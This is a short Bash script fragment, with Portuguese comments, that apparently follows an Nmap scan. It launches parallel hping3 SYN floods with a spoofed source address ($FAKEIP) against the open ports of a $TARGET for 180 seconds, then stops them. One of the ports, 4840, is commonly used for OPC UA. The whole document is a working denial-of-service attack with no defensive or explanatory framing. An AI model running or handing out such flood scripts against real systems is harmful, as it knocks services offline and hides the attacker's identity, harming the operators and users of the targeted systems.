PORTS=("4840" "4192")  # Utilizar as portas abertas encontradas no Nmap
PORTUDP="123"  # Utilizar uma porta UDP ativa

commandRunTime="180"


for port in "${PORTS[@]}"; do
    commands+=("hping3 -S -a $FAKEIP -p $port --flood -V $TARGET")
done


for command in "${commands[@]}"; do
    $command &
done
sleep $commandRunTime
killall hping3